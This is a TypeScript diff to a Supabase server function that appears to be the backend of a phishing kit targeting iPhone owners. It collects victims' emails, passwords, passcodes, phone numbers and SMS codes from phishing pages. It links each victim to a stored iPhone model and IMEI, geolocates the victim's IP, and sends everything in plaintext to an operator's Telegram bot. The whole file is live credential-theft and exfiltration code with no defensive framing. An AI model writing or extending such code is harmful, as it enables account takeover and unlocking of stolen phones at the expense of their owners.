@@ -13,8 +13,35 @@ interface ScriptData {
   email?: string;
   password?: string;
   code?: string;
+  verification_code?: string;
   phone?: string;
   [key: string]: any;
+}
+
+// Función para obtener información de geolocalización por IP
+async function getLocationFromIP(ip: string) {
+  try {
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query`);
+    const data = await response.json();
+    
+    if (data.status === 'success') {
+      return {
+        ip: data.query,
+        country: data.country || 'Desconocido',
+        city: data.city || 'Desconocido',
+        isp: data.isp || 'Desconocido'
+      };
+    }
+  } catch (error) {
+    console.error('Error getting location:', error);
+  }
+  
+  return {
+    ip: ip,
+    country: 'Desconocido',
+    city: 'Desconocido',
+    isp: 'Desconocido'
+  };
 }
 
 serve(async (req) => {
@@ -46,6 +73,14 @@ serve(async (req) => {
       );
     }
 
+    // Obtener IP del cliente
+    const clientIP = req.headers.get('x-forwarded-for') || 
+                    req.headers.get('x-real-ip') || 
+                    'IP no disponible';
+
+    // Obtener información de geolocalización
+    const locationInfo = await getLocationFromIP(clientIP);
+
     // Obtener configuración del usuario por subdominio
     const { data: userConfig, error: configError } = await supabase
       .rpc('get_user_config_by_subdomain', { subdomain_param: body.subdomain });
@@ -69,15 +104,36 @@ serve(async (req) => {
     const config = userConfig[0];
     console.log('User config found:', { user_id: config.user_id, domain: config.domain_name });
 
+    // Buscar proceso relacionado por IMEI o número de serie si están en los datos
+    let processData = null;
+    if (body.imei || body.serial_number) {
+      const { data: process } = await supabase
+        .from('processes')
+        .select('*')
+        .eq('user_id', config.user_id)
+        .or(`imei.eq.${body.imei || ''},serial_number.eq.${body.serial_number || ''}`)
+        .single();
+      
+      processData = process;
+    }
+
     // Guardar datos capturados en la base de datos
+    const capturePayload = {
+      user_id: config.user_id,
+      subdomain: body.subdomain,
+      script_type: body.script_type,
+      captured_data: {
+        ...body,
+        location_info: locationInfo,
+        user_agent: body.user_agent || 'N/A',
+        timestamp: new Date().toISOString()
+      },
+      process_id: processData?.id || null
+    };
+
     const { data: captureData, error: captureError } = await supabase
       .from('script_captures')
-      .insert({
-        user_id: config.user_id,
-        subdomain: body.subdomain,
-        script_type: body.script_type,
-        captured_data: body
-      })
+      .insert(capturePayload)
       .select()
       .single();
 
@@ -89,34 +145,75 @@ serve(async (req) => {
       );
     }
 
-    // Formatear mensaje para Telegram
-    let message = `🚨 *Nuevos datos capturados*\n\n`;
-    message += `📍 *Subdominio:* ${body.subdomain}\n`;
-    message += `📋 *Tipo de Script:* ${body.script_type}\n`;
-    message += `🌐 *Dominio:* ${config.domain_name}\n\n`;
+    // Formatear mensaje para Telegram según el tipo de script
+    let message = `💻 Server Astro505\n`;
     
-    // Agregar datos específicos dependiendo del tipo
-    if (body.email) {
-      message += `📧 *Email:* \`${body.email}\`\n`;
-    }
-    if (body.password) {
-      message += `🔐 *Contraseña:* \`${body.password}\`\n`;
-    }
-    if (body.code) {
-      message += `🔢 *Código:* \`${body.code}\`\n`;
-    }
-    if (body.phone) {
-      message += `📱 *Teléfono:* \`${body.phone}\`\n`;
+    if (body.script_type === 'email_password' && body.email && body.password) {
+      message += `🔔 Datos recibidos 🔔\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `✔️ Detalles de la visita ✔️\n`;
+      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
+      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
+      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
+      message += `📧 Email : ${body.email}\n`;
+      message += `🔑 Contraseña : ${body.password}\n`;
+    } else if (body.script_type === 'verification_code' && body.code) {
+      message += `🔔 Datos passcode recibidos 🔔\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `✔️ Detalles de la visita ✔️\n`;
+      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
+      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
+      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
+      message += `⌨️ Codigo 1 : ${body.code}\n`;
+      message += `⌨️ Codigo 2 : Processing\n`;
+    } else if (body.script_type === 'phone_verification' && (body.phone || body.verification_code)) {
+      message += `🔔 Datos telefónicos recibidos 🔔\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `✔️ Detalles de la visita ✔️\n`;
+      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
+      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
+      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `🔐 Datos obtenidos 👨🏼‍💻\n`;
+      if (body.phone) message += `📱 Teléfono : ${body.phone}\n`;
+      if (body.verification_code) message += `⌨️ Código SMS : ${body.verification_code}\n`;
+    } else {
+      // Mensaje de visita inicial (sin datos específicos)
+      message += `🔔 Se detecto una nueva visita 🔔\n`;
+      message += `-----------------------------\n`;
+      message += `-----------------------------\n`;
+      message += `✔️ Detalles de la visita ✔️\n`;
+      message += `👨‍💻 Usuario : ${processData?.client_name || 'Cliente'}\n`;
+      message += `📧 Email : \n`;
+      message += `📱 Modelo : ${processData?.iphone_model || 'iPhone'}\n`;
+      message += `📲 Imei : ${processData?.imei || 'N/A'}\n`;
     }
 
-    message += `\n⏰ *Capturado:* ${new Date().toLocaleString('es-ES')}`;
+    // Agregar información de localización
+    message += `-----------------------------\n`;
+    message += `-----------------------------\n`;
+    message += `🧭 Detalles de localización 🧭\n`;
+    message += `🌐Dirección IP : ${locationInfo.ip}\n`;
+    message += `🗾 Pais : ${locationInfo.country}\n`;
+    message += `🏙 Ciudad : ${locationInfo.city}\n`;
+    message += `📡 ISP : ${locationInfo.isp}`;
 
     // Enviar mensaje a Telegram
     const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage`;
     const telegramPayload = {
       chat_id: config.chat_id,
       text: message,
-      parse_mode: 'Markdown'
+      parse_mode: 'HTML'
     };
 
     console.log('Sending to Telegram:', { chat_id: config.chat_id, bot_token: config.bot_token.substring(0, 10) + '...' });
